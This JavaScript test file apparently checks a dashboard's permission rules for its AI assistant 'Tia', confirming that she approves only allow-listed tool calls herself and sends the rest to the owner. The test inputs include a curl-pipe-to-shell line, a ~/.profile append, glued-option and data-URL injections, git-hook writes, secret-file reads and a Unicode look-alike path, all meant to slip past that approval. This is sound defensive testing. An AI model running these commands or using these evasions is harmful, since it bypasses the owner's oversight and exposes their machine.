// A chat Tia started, after the turn to an allow-list: what she answers by herself through the whole way (the parser's
// ask, the chat's card, her facts, the policy, send_to_chat), the race between deciding an answer and giving it, a job
// that follows her conversation into a new chat, and her mark on a chat: only her own door sets it, and it goes when the
// conversation ran in a terminal. Claude Code and the terminal's launcher are the stand-ins.
import assert from 'node:assert/strict';
import fs from 'node:fs';
import http from 'node:http';
import path from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';
import { AuditLog } from '../../src/assistant/audit.mjs';
import { CardStore } from '../../src/assistant/cards.mjs';
import { createAssistantCore } from '../../src/assistant/core.mjs';
import { JobStore, planWakes } from '../../src/assistant/jobs.mjs';
import { Skills } from '../../src/assistant/skills.mjs';
import { sandbox } from '../server/helpers.mjs';
import { FakeOps, baseState } from './fake-dashboard.mjs';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const FAKE_CLAUDE = path.join(HERE, '..', 'chat', 'fixtures', 'fake-claude.mjs');
const FAKE_SESSION = path.join(HERE, 'fixtures', 'fake-session.mjs');
const ID = '44444444-4444-4444-8444-444444444444';
const POSIX = { skip: process.platform === 'win32' && 'the stand-ins are POSIX' };

function core(sessions = []) {
  const s = baseState();
  s.assistant = { ...s.assistant, enabled: true, level: 'handsoff' };
  s.sessions.push(...sessions);
  const ops = new FakeOps(s);
  const c = createAssistantCore({
    ops, now: Date.now, cards: new CardStore({ now: Date.now }), audit: new AuditLog({ file: null, now: Date.now }),
    jobs: new JobStore({ dir: null, now: Date.now }), skills: new Skills({ dirs: [] }),
  });
  return { ops, core: c, call: (tool, args) => c.call(tool, args, { conversation: 'c1' }) };
}
const answered = (ops) => ops.calls.filter((c) => c.op === 'answerChat').map((c) => c.args.request);

// ---------- the race ----------

const herChat = {
  computer: 'this', name: `chat:${ID}`, kind: 'chat', chatId: ID, title: 'x', byTia: true, profile: { name: 'sub', label: 'Main', kind: 'subscription' },
  cwd: '/home/owner/projects/web', lastMessage: '', limit: null, sessionId: ID, statusAt: Date.now(), created: 1000,
};
const working = { ...herChat, status: 'working', note: '', ask: null };
const asks = (request, command) => ({ ...herChat, status: 'attention', note: `Claude wants to run: ${command}`, ask: { request, type: 'permission', tool: 'Bash', known: true, subject: command, judged: { command }, owner: false, cut: false, canAlways: false } });

/** A stand-in dashboard that opens `then` between the list her call is judged on and the one it runs on. */
function racing(first, then) {
  const t = core([structuredClone(first)]);
  const list = t.ops.listSessions.bind(t.ops);
  let n = 0;
  t.ops.listSessions = async (a) => {
    const r = await list(a);
    if (++n === 2) t.ops.s.sessions.splice(t.ops.s.sessions.findIndex((x) => x.name === first.name), 1, structuredClone(then)); // after the facts' list
    return r;
  };
  return t;
}

test('the race: an answer goes only to the OK that was judged; one that opened meanwhile is not answered, and she may look and ask again', async () => {
  for (const [first, then, what] of [
    [working, asks('req-new', 'ls'), 'nothing open when judged, a harmless OK when run'],
    [working, { ...asks('req-mcp', 'x'), ask: { request: 'req-mcp', type: 'permission', tool: 'mcp__shell__execute', known: false, subject: 'mcp__shell__execute {"command":"rm"}', owner: false } }, 'nothing open when judged, an MCP OK when run'],
    [asks('req-old', 'ls'), asks('req-new', 'ls'), 'one OK judged, another one with the same words when run'],
  ]) {
    const { ops, call } = racing(first, then);
    await call('list_sessions', {});
    const r = await call('send_to_chat', { session: `chat:${ID}`, answer: 'allow' });
    assert.equal(r.isError, false, `${what}: ${r.text}`);
    assert.match(r.text, /Not answered: .* waits for an OK now that was not in view/, what);
    assert.deepEqual(answered(ops), [], `${what}: nothing answered`);
    // She looks and asks again: judged with that OK in view now.
    await call('list_sessions', {});
    const again = await call('send_to_chat', { session: `chat:${ID}`, answer: 'allow' });
    if (then.ask.known) assert.deepEqual(answered(ops), [then.ask.request], `${what}: the harmless one, judged now, is answered`);
    else assert.match(again.text, /Waiting for the owner's OK/, `${what}: the MCP one, judged now, is a card`);
  }
  // Without a race, saying no and allowing a harmless OK run as before.
  const { ops, call } = core([asks('r1', 'git status')]);
  await call('list_sessions', {});
  assert.equal((await call('send_to_chat', { session: `chat:${ID}`, answer: 'allow' })).isError, false);
  assert.deepEqual(answered(ops), ['r1']);
});

// ---------- a job follows her conversation into a new chat ----------

test('a job keeps following when she continues the same conversation in a new chat within that job', async () => {
  const { ops, core: c, call } = core();
  await call('list_projects', {});
  const r = await call('start_chat', { folder: '/home/owner/projects/api', account: 'sub', message: 'go', goal: 'tests pass' });
  const name = /Started chat (chat:\S+) /.exec(r.text)[1];
  const job = /Job (j_[0-9a-f]{10})/.exec(r.text)[1];
  const first = ops.s.sessions.find((x) => x.name === name);
  // Her chat closes; she opens the same conversation again in a new chat for the same job: the same name, a new time.
  ops.s.sessions.splice(ops.s.sessions.indexOf(first), 1);
  ops.s.conversations['/home/owner/projects/api'].push({ id: first.chatId, at: Date.now(), title: 'go' });
  await call('list_projects', { folder: '/home/owner/projects/api' });
  const again = await call('start_chat', { folder: '/home/owner/projects/api', account: 'sub', conversation: first.chatId, job });
  assert.equal(again.isError, false, again.text);
  const second = ops.s.sessions.find((x) => x.name === name);
  assert.ok(second.created > first.created);
  const entry = c.jobs.get(job).sessions.find((e) => e.session === name);
  assert.equal(entry.created, second.created, 'the entry takes the new chat\'s time');
  assert.equal(c.jobs.get(job).sessions.length, 1);
  const { events } = planWakes([{ ...c.jobs.get(job), sessions: [{ ...entry, armed: true, last: 'working' }] }], [{ ...second, status: 'attention' }], Date.now());
  assert.deepEqual(events.map((e) => e.reason), ['needs_ok'], 'it follows the new chat, not "ended"');
});

// ---------- the whole way, in the real dashboard ----------

function request(base, method, p, { body, headers = {} } = {}) {
  return new Promise((resolve, reject) => {
    const data = body === undefined ? null : JSON.stringify(body);
    const req = http.request(new URL(p, base), { method, headers: { ...(data ? { 'Content-Type': 'application/json', Origin: base } : {}), ...headers } }, (res) => {
      let t = '';
      res.on('data', (c) => (t += c));
      res.on('end', () => {
        let json = null;
        try {
          json = JSON.parse(t);
        } catch {
          /* not JSON */
        }
        resolve({ status: res.statusCode, json });
      });
    });
    req.on('error', reject);
    if (data) req.write(data);
    req.end();
  });
}
const until = async (what, fn, ms = 20_000) => {
  const end = Date.now() + ms;
  let last;
  while (Date.now() < end) {
    try {
      last = await fn();
      if (last) return last;
    } catch (e) {
      last = e;
    }
    await new Promise((r) => setTimeout(r, 100));
  }
  throw new Error(`timed out waiting for ${what} (last: ${last && (last.message || JSON.stringify(last).slice(0, 300))})`);
};

/** A test dashboard of its own (sandbox folders, built-in terminals, the stand-ins), Tia on at `level`. */
async function dashboard(t, name, { level = 'handsoff', idleMs = 30_000 } = {}) {
  const box = sandbox(name);
  // Tia allows herself nothing in a system folder (/tmp among them), so the project lies where a project may.
  const work = fs.mkdtempSync(path.join('/var/tmp', `hoprig-${name}-`));
  const proj = path.join(work, 'proj');
  fs.mkdirSync(proj, { recursive: true });
  const { saveConfig } = await import('../../src/config.mjs');
  const { writeProfile } = await import('../../src/profiles.mjs');
  const { hashPassword } = await import('../../src/server/auth.mjs');
  const { stateDir } = await import('../../src/paths.mjs');
  const { createServer } = await import('../../src/server/server.mjs');
  saveConfig({ launcher: [process.execPath, FAKE_SESSION], server: { backend: 'pty', roots: [work], passwordHash: await hashPassword('pw-for-tests') }, assistant: { enabled: true, level }, sessionDefaults: { permissionMode: 'default' } });
  writeProfile('sub', { label: 'Main' });
  const app = createServer({ watchTickMs: 300, dashboardFile: false, chat: { command: { command: process.execPath, args: [FAKE_CLAUDE] }, resolveEnv: async () => ({ ...process.env }), idleMs } });
  const base = `http://127.0.0.1:${(await app.listen(0, '127.0.0.1')).port}`;
  t.after(async () => {
    await app.close();
    box.cleanup();
    fs.rmSync(work, { recursive: true, force: true });
  });
  const tia = fs.readFileSync(path.join(stateDir(), 'assistant-token'), 'utf8').trim();
  const call = async (tool, args) => (await request(base, 'POST', '/api/assistant/call', { body: { tool, args }, headers: { Authorization: `Bearer ${tia}`, 'X-Hoprig-Conversation': `conv-${name}` } })).json;
  const login = (await new Promise((resolve) => {
    const req = http.request(new URL('/api/login', base), { method: 'POST', headers: { 'Content-Type': 'application/json', Origin: base } }, resolve);
    req.end(JSON.stringify({ password: 'pw-for-tests' }));
  })).headers['set-cookie'][0].split(';')[0];
  const owner = (method, p, body) => request(base, method, p, { body, headers: { Cookie: login } });
  const cardOf = async (id) => (await owner('GET', '/api/state')).json.sessions.find((s) => s.name === `chat:${id}`);
  const start = async (message = 'hello', folder = proj) => {
    const r = await call('start_chat', { folder, message });
    assert.equal(r.isError, false, r.text);
    const id = /Started chat chat:([0-9a-f-]{36})/.exec(r.text)[1];
    await until('her chat idle', async () => (await cardOf(id)).status === 'waiting');
    return id;
  };
  return { box, base, proj, call, owner, cardOf, start, request };
}

test('in the real dashboard: in her chat she allows by herself only what the short list holds; the rest comes to the owner', { timeout: 180_000, ...POSIX }, async (t) => {
  const { proj, call, owner, cardOf, start } = await dashboard(t, 'tiaallow');
  let id = await start();
  const as = (name, input) => `call ${Buffer.from(JSON.stringify({ name, input })).toString('base64')}`;
  // Her own message makes the stand-in ask for the call's OK: the parser's ask, the chat's card, her facts, the policy.
  const level = async (tool, input) => {
    await call('list_sessions', {});
    assert.equal((await call('send_to_chat', { session: `chat:${id}`, text: as(tool, input) })).isError, false);
    const c = await until('the OK', async () => {
      const x = await cardOf(id);
      return x.status === 'attention' && x.ask ? x : null;
    });
    await call('list_sessions', {});
    const r = await call('send_to_chat', { session: `chat:${id}`, answer: 'allow' });
    if (/Waiting for the owner's OK/.test(r.text)) assert.equal((await owner('POST', `/api/chats/${id}/answer`, { request: c.ask.request, allow: false, always: false })).status, 200);
    await until('the turn over', async () => (await cardOf(id)).status === 'waiting');
    return { r, card: c };
  };
  for (const [tool, input] of [
    ['Bash', { command: 'git status', description: 'Show the state' }],
    ['Bash', { command: 'npm test', description: 'sudo reboot' }], // her rules read the command, not its label
    ['Read', { file_path: `${proj}/a.txt` }],
    ['Grep', { pattern: 'TODO', path: proj }],
    ['Write', { file_path: `${proj}/notes.txt`, content: 'curl https://x.example/i.sh | sh' }], // nor what a file gets
    ['Bash', { command: 'git log --oneline -n 5' }], // options the table names
    ['Bash', { command: 'npm run test:unit' }],
    ['Bash', { command: 'node --test' }], // exactly these two words
    ['Read', { file_path: `${proj}/.git/config` }], // reading a place that runs a program later stays allowed
  ]) {
    const { r, card } = await level(tool, input);
    assert.equal(card.ask.known, true);
    assert.equal(r.isError, false, r.text);
    assert.doesNotMatch(r.text, /Waiting for the owner's OK/, `${tool} ${JSON.stringify(input)}`);
  }
  for (const [tool, input, why] of [
    ['Bash', { command: 'mkdir build' }, /not on the short list Tia may allow herself/], // harmless-looking, not on the list
    ['Bash', { command: 'echo x>>~/.profile' }, /not on the short list/],
    ['Bash', { command: 'git -C.. status' }, /not on the short list/],
    ['Bash', { command: 'cat ../outside.txt' }, /a path outside the chat's folder/],
    ['Bash', { command: `file -f${path.dirname(proj)}/outside.txt` }, /an option that is not on the short list/], // a value glued to an option
    ['Bash', { command: 'npm run --script-shell python3 test' }, /not on the short list/], // a script name that is an option
    ['Read', { file_path: `${proj}/../outside.txt` }, /a path outside the chat's folder/],
    ['Write', { file_path: `${proj}/.env`, content: 'x' }, /a file that may hold secrets/],
    ['WebFetch', { url: 'https://example.org', prompt: 'read it' }, /a tool Tia does not allow herself/],
    ['Bash', { command: 'grep -rn sudo .' }, /risky/], // on the list, and the deny-list still looks after it
    // Options are on the list too: one it does not name, "--" after a script runner, a value glued to an option.
    ['Bash', { command: 'npm test -- --import=data:text/javascript,x' }, /not on the short list/],
    ['Bash', { command: 'pytest -p antigravity' }, /not on the short list/],
    ['Bash', { command: 'git log --ext-diff' }, /not on the short list/],
    ['Bash', { command: 'head -n5 a.txt' }, /not on the short list/],
    // The test runners that read their words their own way left the list; a word that starts with "@" or "=" is a card
    // for every command; so is a character outside plain ASCII, in a command and in a path.
    ['Bash', { command: 'pytest' }, /not on the short list/],
    ['Bash', { command: 'go test ./...' }, /not on the short list/],
    ['Bash', { command: 'cargo test' }, /not on the short list/],
    ['Bash', { command: 'node --test test/a.test.mjs' }, /not on the short list/],
    ['Bash', { command: `ls @${path.dirname(proj)}/other/args` }, /a word that starts with .{1,2}@.{1,2} or .{1,2}=/],
    ['Bash', { command: 'ls =ls' }, /a word that starts with .{1,2}@.{1,2} or .{1,2}=/],
    ['Bash', { command: 'cat .g\u0131t/config' }, /not on the short list/],
    ['Write', { file_path: `${proj}/.g\u0131t/hooks/pre-commit`, content: 'x' }, /outside plain ASCII/],
    // A write into a place that makes a program run later; a secret file by its name.
    ['Write', { file_path: `${proj}/.git/hooks/pre-commit`, content: 'x' }, /makes a program run later/],
    ['Edit', { file_path: `${proj}/.mcp.json`, old_string: 'a', new_string: 'b' }, /makes a program run later/],
    ['Read', { file_path: `${proj}/.npmrc` }, /a file that may hold secrets/],
  ]) {
    const { r, card } = await level(tool, input);
    assert.equal(card.ask.known, true, `${tool} ${JSON.stringify(input)}`);
    assert.match(r.text, new RegExp(`Waiting for the owner's OK.*${why.source}`, 's'), `${tool} ${JSON.stringify(input)}`);
  }
  assert.equal((await cardOf(id)).byTia, true, 'her own messages keep the chat hers');
  // A chat whose own folder names secrets (a credentials folder): not a project's folder, even for "ls".
  const creds = path.join(path.dirname(proj), 'credentials', 'web');
  fs.mkdirSync(creds, { recursive: true });
  id = await start('hello', creds);
  for (const [tool, input] of [['Bash', { command: 'ls' }], ['Read', { file_path: `${creds}/README.md` }]]) {
    const { r } = await level(tool, input);
    assert.match(r.text, /Waiting for the owner's OK.*not a project's folder/s, `${tool} in a credentials folder`);
  }
});

test('in the real dashboard: her mark comes only from her own door, and goes when her conversation ran in a terminal', { timeout: 240_000, ...POSIX }, async (t) => {
  const { box, base, proj, call, owner, cardOf, start, request: req } = await dashboard(t, 'tiadoor', { idleMs: 400 });
  const { createToken } = await import('../../src/machines/tokens.mjs');
  const { putMachine } = await import('../../src/machines/store.mjs');
  const { SELF_HEADER } = await import('../../src/machines/relay.mjs');
  const hers = async (id) => (await cardOf(id)).byTia;
  const { token, id: tokenId } = createToken('hub');
  const bearer = (method, p, body, extra = {}) => req(base, method, p, { body, headers: { Authorization: `Bearer ${token}`, ...extra } });

  // A page that says "this is Tia's": opening a chat with it gives the owner's chat; writing with it takes her mark off.
  const opened = await owner('POST', '/api/chats', { dir: proj, profile: 'sub', byTia: true });
  assert.equal(opened.status, 200);
  assert.equal(await hers(opened.json.id), false, 'a page cannot open a chat marked hers');
  let id = await start();
  assert.equal(await hers(id), true);
  assert.equal((await owner('POST', `/api/chats/${id}/send`, { text: 'from the page', byTia: true })).status, 200);
  assert.equal(await hers(id), false, 'a page that claims it is ignored: the owner wrote in it');

  // Another computer's token: hers only with the mark its relay sets for its own (Tia's) requests.
  id = await start();
  assert.equal((await bearer('POST', `/api/chats/${id}/send`, { text: 'relayed', byTia: true }, { [SELF_HEADER]: '1' })).status, 200);
  await until('idle', async () => (await cardOf(id)).status === 'waiting');
  assert.equal(await hers(id), true, 'her relayed send keeps it');
  assert.equal((await bearer('POST', `/api/chats/${id}/send`, { text: 'a page of the hub', byTia: true })).status, 200);
  assert.equal(await hers(id), false, 'without the mark it is a page of the other computer');
  const byHub = await bearer('POST', '/api/chats', { dir: proj, profile: 'sub', defaults: true, byTia: true }, { [SELF_HEADER]: '1' });
  assert.equal(await hers(byHub.json.id), true, 'her relayed start');
  assert.equal(await hers((await bearer('POST', '/api/chats', { dir: proj, profile: 'sub', defaults: true, byTia: true })).json.id), false);

  // Through a real relay (this dashboard as its own other computer): a page's claim loses the mark, her door keeps it.
  putMachine({ name: 'self', label: 'Self', via: 'url', url: base, token, tokenId });
  id = await start();
  assert.equal((await owner('POST', `/m/self/api/chats/${id}/send`, { text: 'via the relay', byTia: true })).status, 200);
  await until('the relayed message', async () => (await cardOf(id)).byTia === false);
  id = await start();
  await call('get_computer_status', {}); // as she does: a computer and a session she acts on were shown to her first
  await call('list_sessions', { computer: 'self' });
  const viaDoor = await call('send_to_chat', { session: `chat:${id}`, computer: 'self', text: 'relayed by her door' });
  assert.equal(viaDoor.isError, false, viaDoor.text);
  await until('her relayed message answered', async () => (await owner('GET', `/api/chats/${id}`)).json.events.some((e) => e.kind === 'text' && /relayed by her door/.test(e.text)));
  assert.equal(await hers(id), true, 'her door\'s request, relayed, keeps it hers');

  // Taken back from a terminal that ran her conversation: hers no more.
  const running = async (i) => (await owner('GET', `/api/chats/${i}`)).json.running;
  const inTerminal = async (i) => {
    await until('her chat\'s process to stop', async () => !(await running(i)));
    const term = await owner('POST', '/api/sessions', { dir: proj, profile: 'sub', mode: 'resume', sessionId: i });
    assert.equal(term.status, 200, JSON.stringify(term.json));
    await until('the chat to see the terminal', async () => (await owner('GET', `/api/chats/${i}`)).json.terminal);
    return term.json.name;
  };
  id = await start();
  await inTerminal(id);
  assert.equal(await hers(id), true, 'while the terminal only runs, nothing is taken back yet');
  assert.equal((await owner('POST', `/api/chats/${id}/take`, {})).status, 200);
  assert.equal(await hers(id), false, 'taken back from the terminal');
  id = await start();
  const term = await inTerminal(id);
  const back = await owner('POST', '/api/chats/from-session', { session: term });
  assert.equal(back.json.id, id, 'the chat that is open');
  assert.equal(await hers(id), false, 'taken from the terminal into a chat');

  // The conversation went on elsewhere while her chat had no process (its transcript grew without it): hers no more.
  id = await start();
  await until('her chat\'s process to stop', async () => !(await running(id)));
  const find = (dir) => fs.readdirSync(dir, { withFileTypes: true }).flatMap((e) => (e.isDirectory() ? find(path.join(dir, e.name)) : e.name === `${id}.jsonl` ? [path.join(dir, e.name)] : []));
  const [file] = find(box.claude);
  const lines = fs.readFileSync(file, 'utf8').trim().split('\n');
  fs.appendFileSync(file, `${lines.find((l) => JSON.parse(l).type === 'user')}\n`);
  assert.equal(await hers(id), true, 'not looked at yet');
  await owner('GET', `/api/chats/${id}`);
  assert.equal(await hers(id), false);
});
